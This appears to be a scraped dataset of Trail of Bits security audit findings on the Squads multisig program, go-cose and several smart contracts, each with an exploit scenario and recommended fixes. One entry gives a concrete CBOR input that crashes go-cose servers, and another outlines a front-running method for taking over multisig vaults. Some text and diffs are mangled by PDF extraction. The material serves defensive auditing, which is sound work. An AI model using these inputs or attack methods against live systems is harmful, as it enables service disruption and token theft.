        "body": "The Squads multisig program does not appear to be linted by Clippy regularly. The Clippy linter contains hundreds of lints to help catch common mistakes and improve Rust code. Clippy should be run on most projects regularly. Running Clippy with no ags (not even -W clippy::pedantic) over the Squads multisig program produces several warnings. Examples appear in gure 2.1. warning: useless conversion to the same type: `std::ops::Range<u8>` --> programs/squads_multisig_program/src/instructions/batch_add_transaction.rs:117:47 | 117 | let ephemeral_signer_bumps: Vec<u8> = (0..args.ephemeral_signers) | _______________________________________________^ 118 | | .into_iter() | |________________________^ help: consider removing `.into_iter()`: `(0..args.ephemeral_signers)` | = help: for further information visit https://rust-lang.github.io/rust-clippy/master/index.html#useless_conversion = note: `#[warn(clippy::useless_conversion)]` on by default warning: this expression creates a reference which is immediately dereferenced by the compiler --> programs/squads_multisig_program/src/instructions/config_transaction_execute.rs:175: 29 | 175 | ... | | = help: for further information visit &SEED_PREFIX, ^^^^^^^^^^^^ help: change this to: `SEED_PREFIX` https://rust-lang.github.io/rust-clippy/master/index.html#needless_borrow = note: `#[warn(clippy::needless_borrow)]` on by default ... Figure 2.1: Sample warnings produced by running Clippy over the codebase Exploit Scenario Mallory uncovers a bug in the Squads multisig program. The bug might have been caught if Squads developers had enabled additional lints. Recommendations Short term, review all of the warnings currently generated by Clippys default lints. Address those for which it makes sense to do so. Disable others using allow attributes. Taking these steps will produce cleaner code, which in turn will reduce the likelihood that the code contains bugs. Long term, take the following steps:  Regularly run Clippy with -W clippy::pedantic enabled. The pedantic lints provide additional suggestions to help improve the quality of code.  Regularly review Clippy lints that have been allowed to see whether they should still be given such an exemption. Allowing a Clippy lint unnecessarily could cause bugs to be missed.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Functions invariant and invalidate_prior_transactions called in wrong order ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf",
        "body": "In several places within the Squads multisig program, the invariant method is called prior to the invalidate_prior_transactions method. However, invalidate_prior_transactions modies the stale_transaction_index eld, which invariant checks. Hence, it would make more sense to call invariant after calling invalidate_prior_transactions. The denition of invalidate_prior_transactions and the relevant portion of invariant appear in gures 4.1 and 4.2, respectively. An example where this issue occurs appears in gure 4.3. 175 176 /// Makes the transactions created up until this moment stale. /// Should be called whenever any multisig parameter related to the voting consensus is changed. 177 178 179 pub fn invalidate_prior_transactions(&mut self) { self.stale_transaction_index = self.transaction_index; } Figure 4.1: Denition of invalidate_prior_transactions (programs/squads_multisig_program/src/state/multisig.rs#175179) 166 // `state.stale_transaction_index` must be less than or equal to `state.transaction_index`. require!( 167 168 169 170 stale_transaction_index <= transaction_index, MultisigError::InvalidStaleTransactionIndex ); Figure 4.2: Relevant portion of invariant (programs/squads_multisig_program/src/state/multisig.rs#166170) 79 pub fn multisig_add_member(ctx: Context<Self>, args: MultisigAddMemberArgs) -> Result<()> { 108 109 110 111 112 113 ... multisig.invariant()?; multisig.invalidate_prior_transactions(); Ok(()) } Figure 4.3: Example where invariant is called prior to invalidate_prior_transactions (programs/squads_multisig_program/src/instructions/multisig_config.rs#79 113) This issue aects the following locations:  programs/squads_multisig_program/src/instructions/multisig_config .rs#L108-L110  programs/squads_multisig_program/src/instructions/multisig_config .rs#L139-L141  programs/squads_multisig_program/src/instructions/multisig_config .rs#L159-L161  programs/squads_multisig_program/src/instructions/multisig_config .rs#L176-L178  programs/squads_multisig_program/src/instructions/multisig_config .rs#L196-L198 Note that this nding is informational since the existence of the invariant method exceeds industry norms. Exploit Scenario The invalidate_prior_transactions method is modied in a way that causes it to no longer satisfy the invariant method. The Squads multisig program is deployed with the modication. The bug might have been caught prior to deployment if the methods had been called in the reverse order. Recommendations Short term, reverse the order of the calls to invariant and invalidate_prior_transactions in all of the locations listed above. Doing so will ensure that invalidate_prior_transactionss modications of the stale_transaction_index eld preserve the invariant. Long term, as new instructions are added to the multisig program, ensure that invariant is always the last thing called. Adopting such a policy will help to prevent future code from introducing bugs.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Insu\u0000cient test coverage ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf",
        "body": "Signicant portions of the multisig program are untested. Squads Protocol should strive for near 100% test coverage to help ensure condence in the code. The following are some of the limitations of the programs current Anchor tests:  The three instructions multisig_remove_member, multisig_set_time_lock, and multisig_set_config_authority are untested (programs/squads_multisig_program/src/lib.rs#L42-L64).  The use of ephemeral signer seeds in batch transitions is untested (programs/squads_multisig_program/src/instructions/batch_add_transaction.rs#L11 9-L131).  Of the six possible ConfigActions, only SetTimeLock is tested (programs/squads_multisig_program/src/instructions/cong_transaction_execute.rs #L139-L275).  The following blocks within config_transaction_execute are untested:  programs/squads_multisig_program/src/instructions/cong_transaction_exec ute.rs#L114-L135  programs/squads_multisig_program/src/instructions/cong_transaction_exec ute.rs#L279-L285  programs/squads_multisig_program/src/instructions/cong_transaction_exec ute.rs#L312-L316  The use of periods in spending limits is untested (programs/squads_multisig_program/src/instructions/spending_limit_use.rs#L156-L 170). Additional testing might have revealed TOB-SQUADS-8, for example. Exploit Scenario A bug is found in one of the above pieces of case. The bug could have been exposed by more thorough Anchor tests. Recommendations Short term, add or expand the projects Anchor tests to address each of the above noted deciencies. Doing so will help increase condence in the multisig programs code. Long term, regularly review the multisig programs tests. Doing so will help ensure that the tests are relevant and that all important conditions are tested.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Insu\u0000cient logging ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf",
        "body": "Log messages generated during program execution aid in monitoring, baselining behavior, and detecting suspicious activity. Without log messages, users and blockchain monitoring systems cannot easily detect behavior that falls outside the baseline conditions. This may prevent malfunctioning programs or malicious attacks from being discovered. At a minimum, each instruction should log the following information:  The instructions arguments  Addresses of signicant accounts involved, and the roles they played  The instructions eects  Non-obvious code paths taken by the instruction Note that program logs are displayed in tools Solana Explorer and Solana Beach. Thus, such information benets users (i.e., humans) in addition to blockchain monitoring tools. The Squads multisig does perform some limited logging now using the msg! macro. The following is a complete list of the locations where the macro is used:  config_transaction_create.rs:99  vault_transaction_create.rs:129  spending_limit_use.rs:231  batch_create.rs:100  batch_add_transaction.rs:142  batch_add_transaction.rs:143 Exploit Scenario An attacker discovers a vulnerability in the Squads multisig program and exploits it. Because the actions generate no log messages, the behavior goes unnoticed until there is follow-on damage, such as nancial loss. Recommendations Short term, add the minimal logging information listed above to each instruction. Doing so will make it easier for blockchain monitoring systems to detect problems with Squads multisig wallets. It will also make it easier for users to review past transactions. Long term, consider using a blockchain monitoring system to track any suspicious behavior in the programs. A monitoring mechanism for critical events would quickly detect any compromised system components. Additionally, develop an incident response plan if Squads Protocol does not already have one. Doing so will help ensure that issues are dealt with promptly and without confusion.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Attacker can front-run multisig creation transaction ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf",
        "body": "A multisig account is derived from an unauthenticated create_key. An attacker can front-run a users multisig creation transaction and create the multisig with their own parameters, allowing them to perform transactions from that multisig. The attacker can steal tokens from the multisig vaults if the user is unaware of the front-running and continues to use the multisig. A multisig account is a PDA derived from the key of the create_key account (gure 7.1). 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #[derive(Accounts)] #[instruction(args: MultisigCreateArgs)] pub struct MultisigCreate<'info> { #[account( init, payer = creator, space = Multisig::size(args.members.len()), seeds = [SEED_PREFIX, SEED_MULTISIG, create_key.key().as_ref()], bump )] pub multisig: Account<'info, Multisig>, /// A random public key that is used as a seed for the Multisig PDA. /// CHECK: This can be any random public key. pub create_key: AccountInfo<'info>, Figure 7.1: Accounts struct for the multisig_create instruction in (programs/squads_multisig_program/src/instructions/multisig_create.rs#20 34) The create_key account is not authenticated; any user can call the multisig_create instruction with any create_key account and initialize the corresponding multisig account. As a result, an attacker monitoring new transactions can check for multisig creation transactions and front-run these transactions by copying the create_key account and then creating the multisig account themselves. Because the attacker is creating the multisig, they can set their own values for members. The attacker could make minimal changes to the members list that go unnoticed and then perform operations on the multisig (e.g., transfer tokens from the vaults), after some activity by the original users. Exploit Scenario",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Program uses same set of ephemeral keys for all transactions in a batch ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf",
        "body": "The same set of ephemeral keys is used for multiple transactions of a batch. As a result, the transactions may fail to execute if they require the ephemeral keys to be unique for each of the transactions. The ephemeral keys are temporary PDA accounts that sign the vault transactions. They are intended to be used as one-time keys or accounts by the transaction. For example, an ephemeral key could be used to create a mint account or a token account, as the key is not required after setting the proper authority. Because multiple accounts cannot be created using the same ephemeral account, this use case requires that ephemeral keys are unique for each of the transactions. However, for a batch transaction, which may contain multiple vault transactions, the ephemeral keys are derived from the batch transactions account key. As a result, the derived ephemeral keys will be the same for all transactions in that batch (gure 8.1). 106 107 108 /// Add a transaction to the batch. #[access_control(ctx.accounts.validate())] pub fn batch_add_transaction(ctx: Context<Self>, args: BatchAddTransactionArgs) -> Result<()> { 117 118 119 120 121 122 123 124 125 126 127 128 [...] let ephemeral_signer_bumps: Vec<u8> = (0..args.ephemeral_signers) .into_iter() .map(|ephemeral_signer_index| { let ephemeral_signer_seeds = &[ SEED_PREFIX, batch_key.as_ref(), SEED_EPHEMERAL_SIGNER, &ephemeral_signer_index.to_le_bytes(), ]; let (_, bump) = Pubkey::find_program_address(ephemeral_signer_seeds, ctx.program_id); 129 130 131 132 bump }) .collect(); Figure 8.1: A snippet of batch_add_transaction instruction in (programs/squads_multisig_program/src/instructions/batch_add_transaction. rs#106132) If two of the transactions in a batch try to create a new account using the ephemeral key, then the second transaction will fail to execute, as an account would have already been initialized under the ephemeral key by the rst transaction. Also, because the transactions in the batch are executed sequentially, the transactions after the failed transaction cannot be executed either. The users would have to create new transactions and go through the transaction approval process again to perform the operations. Exploit Scenario Bob and his team use the Squads protocol for treasury management. The team intends to deploy a new protocol. The deployment process involves successful execution of a batch transaction from the multisig, which creates new mint accounts for the program and transfers tokens from the multisig vaults to the program-owned token accounts. Bob, unaware of the issue, creates a batch such that the rst and second transactions create mint accounts using the ephemeral keys. The next ve transactions transfer tokens and handle other operations required for deployment. The batch transaction is approved by the team and Bob tries to execute each transaction after the timelock of one week. The execution of the second transaction fails and the transactions after that cannot be executed. Bob, unsure of the issue, creates regular vault transactions for the last six unexecuted transactions. The team has to approve each transaction and Bob has to execute them after the timelock. This creates a noticeable delay in the deployment of Bobs protocol. Recommendations Short term, derive the ephemeral keys using the key of the account used to store the individual transactions in the batch. Doing so will result in unique ephemeral keys for each transaction. Long term, as recommended in TOB-SQUADS-5, expand the projects tests to ensure that the program is behaving as expected for all intended use cases.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Ine\u0000cient lookup table account verication during transaction execution ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf",
        "body": "The program does not strictly verify that lookup table accounts given at the time of execution exactly match with the accounts given at the time of transaction initialization. The current implementation performs unnecessary on-chain computation and wastes gas. The Squads protocol allows the usage of the address lookup tables for vault transactions. Each transaction account stores the list of address lookup table accounts and indices of the accounts that will be used by the transaction. The addresses stored in the lookup table account are expected to not change after the initialization of the transaction. This guarantee is provided by checking that the accounts are owned by the solana_address_lookup_table program. The vault_transaction_execute instruction executes the approved transactions. The instruction takes a list of address lookup table accounts that are veried to be the same as the accounts that are given at the time of initialization in ExecutableTransactionMessage::new_validated (gure 9.1). 28 /// `address_lookup_table_account_infos` - AccountInfo's that are expected to correspond to the lookup tables mentioned in `message.address_table_lookups`. 29 30 31 33 34 36 37 /// `vault_pubkey` - The vault PDA that is expected to sign the message. pub fn new_validated( message: &'a VaultTransactionMessage, address_lookup_table_account_infos: &'a [AccountInfo<'info>], [...] ) -> Result<Self> { // CHECK: `address_lookup_table_account_infos` must be valid and be the ones mentioned in `message.address_table_lookups`. `AddressLookupTable`s // require_eq!( 38 39 40 41 42 43 44 address_lookup_table_account_infos.len(), message.address_table_lookups.len(), MultisigError::InvalidNumberOfAccounts ); let lookup_tables: HashMap<&Pubkey, &AccountInfo> = address_lookup_table_account_infos .iter() .map(|maybe_lookup_table| { 45 46 47 // The lookup table account must be owned by SolanaAddressLookupTableProgram. 48 49 require!( maybe_lookup_table.owner == &solana_address_lookup_table_program::id(), 50 51 52 MultisigError::InvalidAccount ); // The lookup table must be mentioned in `message.address_table_lookups`. 53 54 55 56 57 require!( message .address_table_lookups .iter() .any(|lookup| &lookup.account_key == maybe_lookup_table.key), 58 59 60 61 62 MultisigError::InvalidAccount ); Ok((maybe_lookup_table.key, maybe_lookup_table)) }) .collect::<Result<HashMap<&Pubkey, &AccountInfo>>>()?; Figure 9.1: A snippet of ExecutableTransactionMessage::new_validated function showing the validations performed on lookup table accounts (programs/squads_multisig_program/src/utils/executable_transaction_messag e.rs#2862) The new_validated function iterates over the address_lookup_table_account_infos and checks that each of the accounts is owned by the solana_address_lookup_table program and that the account is present in message.address_table_lookups. The function does not strictly validate that both lists match. Requiring that message.address_table_lookups and address_lookup_table_account_infos list the address lookup tables in the same order would result in a more ecient implementation. Exploit Scenario Alice, a Solana developer, writes code that uses a Squads multisig wallets accounts lookup table feature. Alice is unnecessarily charged for gas. The unnecessary charges would be eliminated by a more ecient implementation of the accounts lookup table feature. Recommendations Short term, rewrite the code to zip message.address_table_lookups together with address_lookup_table_account_infos, and go through each of the pairs to verify that they match. Doing so will help protect against incomplete checks and will also make the implementation more ecient. Long term, as recommended in TOB-SQUADS-5, expand the projects tests to ensure that the program is behaving as expected for all intended use cases. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Unmarshalling can cause a panic if any header labels are unhashable ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-microsoft-go-cose-securityreview.pdf",
        "body": "The ensureCritical function checks that all critical labels exist in the protected header. The check for each label is shown in Figure 1.1. 161 if _, ok := h[label]; !ok { Figure 1.1: Line 161 of headers.go The label in this case is deserialized from the users CBOR input. If the label is a non-hashable type (e.g., a slice or a map), then Go will runtime panic on line 161. Exploit Scenario Alice wishes to crash a server running go-cose. She sends the following CBOR message to the server: \\xd2\\x84G\\xc2\\xa1\\x02\\xc2\\x84@0000C000C000. When the server attempts to validate the critical headers during unmarshalling, it panics on line 161. Recommendations Short term, add a validation step to ensure that the elements of the critical header are valid labels. Long term, integrate go-coses existing fuzz tests into the CI pipeline. Although this bug was not discovered using go-coses preexisting fuzz tests, the tests likely would have discovered it if they ran for enough time. Fix Analysis This issue has been resolved. Pull request #78, committed to the main branch in b870a00b4a0455ab5c3da1902570021e2bac12da, adds validations to ensure that critical headers are only integers or strings. 15 Microsoft go-cose Security Assessment (DRAFT)",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. crit label is permitted in unvalidated headers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-microsoft-go-cose-securityreview.pdf",
        "body": "The crit header parameter identies which header labels must be understood by an application receiving the COSE message. Per RFC 8152, this value must be placed in the protected header bucket, which is authenticated by the message signature. Figure 2.1: Excerpt from RFC 8152 section 3.1 Currently, the implementation ensures during marshaling and unmarshaling that if the crit parameter is present in the protected header, then all indicated labels are also present in the protected header. However, the implementation does not ensure that the crit parameter is not present in the unprotected bucket. If a user mistakenly uses the unprotected header for the crit parameter, then other conforming COSE implementations may reject the message and the message may be exposed to tampering. Exploit Scenario A library user mistakenly places the crit label in the unprotected header, allowing an adversary to manipulate the meaning of the message by adding, removing, or changing the set of critical headers. Recommendations Add a check during ensureCritical to verify that the crit label is not present in the unprotected header bucket. Fix Analysis This issue has been resolved. Pull request #81, committed to the main branch in 62383c287782d0ba5a6f82f984da0b841e434298, adds validations to ensure that the crit label is not present in unprotected headers. 16 Microsoft go-cose Security Assessment (DRAFT)",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Generic COSE header types are not validated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-microsoft-go-cose-securityreview.pdf",
        "body": "Section 3.1 of RFC 8152 denes a number of common COSE header parameters and their associated value types. Applications using the go-cose library may rely on COSE-dened headers decoded by the library to be of a specied type. For example, the COSE specication denes the content-type header (label #3) as one of two types: a text string or an unsigned integer. The go-cose library validates only the alg and crit parameters, not content-type. See Figure 3.1 for a list of dened header types. Figure 3.1: RFC 8152 Section 3.1, Table 2 Further header types are dened by the IANA COSE Header Parameter Registry. 17 Microsoft go-cose Security Assessment (DRAFT) Exploit Scenario An application uses go-cose to verify and validate incoming COSE messages. The application uses the content-type header to index a map, expecting the content type to be a valid string or integer. An attacker could, however, supply an unhashable value, causing the application to panic. Recommendations Short term, explicitly document which IANA-dened headers or label ranges are and are not validated. Long term, validate commonly used headers for type and semantic consistency. For example, once counter signatures are implemented, the counter-signature (label #7) header should be validated for well-formedness during unmarshalling. 18 Microsoft go-cose Security Assessment (DRAFT)",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Lack of zero-value checks in setter functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-ailayerlabs-6079smartcontracts-securityreview.pdf",
        "body": "Certain functions fail to validate incoming arguments, so callers of these functions could mistakenly set important state variables to a zero value, misconguring the system. For example, the Distribution_init function in the Distribution contract sets the depositToken , l1Sender , and splitter variables to the addresses passed as arguments without checking whether any of the values are the zero address. This may result in undened behavior in the system. function Distribution_init ( address depositToken_ , address l1Sender_ , address splitter_ , FeeData calldata feeData_, Pool calldata pool_ ) external initializer { __Ownable_init(); __UUPSUpgradeable_init(); depositToken = depositToken_; l1Sender = l1Sender_; splitter = splitter_; ... } Figure 1.1: The Distribution_init function ( Distribution contract, L3854 ) In addition to the above, the following setter functions also lack zero-value checks:  Distribution  editPool  L1Sender  setRewardTokenConfig  L2MessageReceiver  setParams  RewardClaimer  RewardClaimer__init  setSplitter  setL1Sender Exploit Scenario Alice deploys a new version of the Distribution contract. When she invokes Distribution_init to set the contracts parameters, she mistakenly enters a zero value, thereby misconguring the system. Recommendations Short term, add zero-value checks to all function arguments to ensure that callers cannot set incorrect values and miscongure the system. Long term, use the Slither static analyzer to catch common issues such as this one. Consider integrating a Slither scan into the projects CI pipeline, pre-commit hooks, or build scripts.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Lack of event generation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-ailayerlabs-6079smartcontracts-securityreview.pdf",
        "body": "Multiple user operations do not emit events. As a result, it will be dicult to review the contracts behavior for correctness once they have been deployed. Events generated during contract execution aid in monitoring, baselining of behavior, and detection of suspicious activity. Without events, users and blockchain-monitoring systems cannot easily detect behavior that falls outside the baseline conditions; malfunctioning contracts and attacks could go undetected. The following operations should trigger events:  Splitter  Splitter__init  updatePool  updateGroupShares  removeUpgradeability  L1Sender  L1Sender__init  setRewardTokenConfig  setDepositTokenConfig  updateAllowedAddresses  sendDepositToken  sendMintMessage  Distribution  removeUpgradeability  L2MessageReceiver  setParams  L2TokenReceiver  editParams  withdrawToken  withdrawTokenId  RewardClaimer  RewardClaimer__init  setSplitter  setL1Sender  Token  updateMinter Exploit Scenario An attacker discovers a vulnerability in any of these contracts and modies its execution. Because these actions generate no events, the behavior goes unnoticed until there is follow-on damage, such as nancial loss. Recommendations Short term, add events for all operations that could contribute to a higher level of monitoring and alerting. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Risk of token loss due to lack of zero-value check of destination address ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-ailayerlabs-6079smartcontracts-securityreview.pdf",
        "body": "We identied two functions that fail to verify whether the destination address is the zero address before sending tokens. This can lead to the unintentional burning of tokens. First, as shown in gure 3.1, the claim function in the Distribution contract takes a receiver address, which is user-provided, and subsequently uses it to send native tokens via the sendMintMessage function in the L1Sender contract. Consequently, if the user mistakenly provides the zero address as the receiver argument, the tokens will inadvertently be burnt. function claim ( address receiver_ ) external payable { address user_ = _msgSender(); UserData storage userData = usersData[user_]; ... // Transfer rewards IL1Sender(l1Sender).sendMintMessage{value: msg.value }(receiver_, pendingRewards_, user_); emit UserClaimed(user_, receiver_, pendingRewards_); } Figure 3.1: The claim function ( Distribution contract, L184209 ) Second, the claim function in the RewardClaimer contract does not verify whether the receiver_ argument is the zero address; tokens will also be burned if a user supplies the zero address for this argument. Exploit Scenario Alice invokes the claim function in the Distribution contract to claim reward tokens. However, by mistake she supplies the zero address as the receiver address. Consequently, the claimed rewards are transmitted to the zero address, causing the tokens to be irreversibly lost. Recommendations Short term, add zero-address checks to the function arguments to ensure that callers cannot set incorrect values that result in the loss of tokens. Long term, use the Slither static analyzer to catch common issues such as this one. Consider integrating a Slither scan into the projects CI pipeline, pre-commit hooks, or build scripts. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. The _setupRole function is deprecated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-l1-l3-teleporter-securityreview.pdf",
        "body": "The L1Teleporter contract inherits the Openzeppelins AccessControl contract. In the constructor function, the contract uses the _setupRole function to give the DEFAULT_ADMIN_ROLE to the _admin address and PAUSER_ROLE to the _pauser address (gure 1.1). However, the _setupRole function is deprecated in favor of the _grantRole function (gure 1.2). constructor(address _l2ForwarderFactory, address _l2ForwarderImplementation, address _admin, address _pauser) L2ForwarderPredictor(_l2ForwarderFactory, _l2ForwarderImplementation) { } _setupRole(DEFAULT_ADMIN_ROLE, _admin); _setupRole(PAUSER_ROLE, _pauser); Figure 1.1: The constructor function (L1Teleporter.sol#L24-L29) * NOTE: This function is deprecated in favor of {_grantRole}. */ function _setupRole(bytes32 role, address account) internal virtual { _grantRole(role, account); } Figure 1.2: The _setupRole function (AccessControl.sol#L204-L208) Recommendations Short term, use the _grantRole function instead of the _setupRole function. Long term, when using third-party libraries, make sure to accurately review the documentation and follow recommendations when using the libraries.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Vacuous unit tests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-l1-l3-teleporter-securityreview.pdf",
        "body": "The tests for the fee logic of the L1Teleporter contract are tautological and assert that the calculation of the function being tested is equivalent to the same calculation. While this may increase code coverage, it does not specify what is correct, but rather denes the implementation as correct. Concrete values should be used instead of reperforming the calculation. assertEq( standardEth, standardCosts.l1l2TokenBridgeCost + standardCosts.l2ForwarderFactoryCost + standardCosts.l2l3TokenBridgeCost, \"standardEth\" ); // we only check RetryableGasCosts once because it'll be the same for all modes assertEq( standardCosts.l1l2FeeTokenBridgeCost, gasParams.l1l2FeeTokenBridgeGasLimit * gasParams.l2GasPriceBid + gasParams.l1l2FeeTokenBridgeMaxSubmissionCost, \"l1l2FeeTokenBridgeCost\" ); assertEq( standardCosts.l1l2TokenBridgeCost, gasParams.l1l2TokenBridgeGasLimit * gasParams.l2GasPriceBid + gasParams.l1l2TokenBridgeMaxSubmissionCost, \"l1l2TokenBridgeCost\" ); assertEq( standardCosts.l2ForwarderFactoryCost, gasParams.l2ForwarderFactoryGasLimit * gasParams.l2GasPriceBid + gasParams.l2ForwarderFactoryMaxSubmissionCost, \"l2ForwarderFactoryCost\" ); assertEq( standardCosts.l2l3TokenBridgeCost, gasParams.l2l3TokenBridgeGasLimit * gasParams.l3GasPriceBid + gasParams.l2l3TokenBridgeMaxSubmissionCost, \"l2l3TokenBridgeCost\" ); } Figure 2.1: Test reimplementing contracts calculation (l1-l3-teleport-contracts/test/Teleporter.t.sol#201231) Recommendations Short term, add unit tests that explicitly specify expected values, and perform integration testing against a devnet deployment of Arbitrum Nitro. Long term, create and implement testing plans as part of the design and development of new features.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Suggested refactorings to make precedence explicit and simplify code ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-l1-l3-teleporter-securityreview.pdf",
        "body": "In the L1Teleporter and L2Forwarder contracts, some calculations chain arithmetic operations and rely on the implicit precedence of the operators instead of making the desired precedence syntactically explicit with parentheses (gures 3.1 and 3.2). In addition, some calculations are redundant, and the values can be reused to clarify that the values are expected to be equivalent (gures 3.2 and 3.3). Below are alternative implementations that are more explicit. diff --git a/contracts/L1Teleporter.sol b/contracts/L1Teleporter.sol index 52d440f..f27e9f9 100644 --- a/contracts/L1Teleporter.sol +++ b/contracts/L1Teleporter.sol @@ -219,13 +219,13 @@ contract L1Teleporter is Pausable, AccessControl, L2ForwarderPredictor, IL1Telep returns (RetryableGasCosts memory results) { results.l1l2FeeTokenBridgeCost = gasParams.l1l2FeeTokenBridgeMaxSubmissionCost - + + gasParams.l1l2FeeTokenBridgeGasLimit * gasParams.l2GasPriceBid; + (gasParams.l1l2FeeTokenBridgeGasLimit * gasParams.l2GasPriceBid); results.l1l2TokenBridgeCost = gasParams.l1l2TokenBridgeMaxSubmissionCost + - gasParams.l1l2TokenBridgeGasLimit * gasParams.l2GasPriceBid; + (gasParams.l1l2TokenBridgeGasLimit * gasParams.l2GasPriceBid); gasParams.l1l2TokenBridgeMaxSubmissionCost + results.l2ForwarderFactoryCost = gasParams.l2ForwarderFactoryMaxSubmissionCost - + + gasParams.l2ForwarderFactoryGasLimit * gasParams.l2GasPriceBid; + (gasParams.l2ForwarderFactoryGasLimit * gasParams.l2GasPriceBid); results.l2l3TokenBridgeCost = gasParams.l2l3TokenBridgeMaxSubmissionCost + - gasParams.l2l3TokenBridgeGasLimit * gasParams.l3GasPriceBid; + (gasParams.l2l3TokenBridgeGasLimit * gasParams.l3GasPriceBid); gasParams.l2l3TokenBridgeMaxSubmissionCost + } Figure 3.1: Suggested change to make desired precedence explicit (l1-l3-teleport-contracts/contracts/L1Teleporter.sol#220-229) diff --git a/contracts/L2Forwarder.sol b/contracts/L2Forwarder.sol index b250e51..d617efa 100644 --- a/contracts/L2Forwarder.sol +++ b/contracts/L2Forwarder.sol @@ -96,7 +96,8 @@ contract L2Forwarder is IL2Forwarder { // create retryable ticket uint256 maxSubmissionCost = uint256 callValue = tokenBalance - maxSubmissionCost - params.gasLimit * IERC20Inbox(params.routerOrInbox).calculateRetryableSubmissionFee(0, 0); - params.gasPriceBid; + params.gasPriceBid); + uint256 totalFeeAmount = maxSubmissionCost + (params.gasLimit * uint256 callValue = tokenBalance - totalFeeAmount; IERC20Inbox(params.routerOrInbox).createRetryableTicket({ to: params.to, l2CallValue: callValue, @@ -109,7 +110,7 @@ contract L2Forwarder is IL2Forwarder { data: \"\" }); emit BridgedToL3(callValue, maxSubmissionCost + params.gasLimit * - params.gasPriceBid); + emit BridgedToL3(callValue, totalFeeAmount); } Figure 3.2: Suggested change to perform fee calculation once (l1-l3-teleport-contracts/contracts/L2Forwarder.sol#99112) diff --git a/contracts/L1Teleporter.sol b/contracts/L1Teleporter.sol index 52d440f..df545a8 100644 --- a/contracts/L1Teleporter.sol +++ b/contracts/L1Teleporter.sol @@ -133,14 +133,14 @@ contract L1Teleporter is Pausable, AccessControl, L2ForwarderPredictor, IL1Telep teleportationType = toTeleportationType({token: params.l1Token, feeToken: params.l3FeeTokenL1Addr}); + ethAmount = costs.l1l2TokenBridgeCost + costs.l2ForwarderFactoryCost; if (teleportationType == TeleportationType.Standard) { ethAmount = costs.l1l2TokenBridgeCost + costs.l2ForwarderFactoryCost + - costs.l2l3TokenBridgeCost; + ethAmount += costs.l2l3TokenBridgeCost; feeTokenAmount = 0; } else if (teleportationType == TeleportationType.OnlyCustomFee) { - ethAmount = costs.l1l2TokenBridgeCost + costs.l2ForwarderFactoryCost; feeTokenAmount = costs.l2l3TokenBridgeCost; } else { ethAmount = costs.l1l2TokenBridgeCost + costs.l1l2FeeTokenBridgeCost + - costs.l2ForwarderFactoryCost; + ethAmount += costs.l1l2FeeTokenBridgeCost; feeTokenAmount = costs.l2l3TokenBridgeCost; } } Figure 3.3: Suggested change to emphasize base fee amount for all types (l1-l3-teleport-contracts/contracts/L1Teleporter.sol#136147) Recommendations Short term, apply the refactorings suggested above. Long term, prefer explicit precedence and reuse values where they are expected to be identical rather than recomputing them.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Undocumented struct elds ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-l1-l3-teleporter-securityreview.pdf",
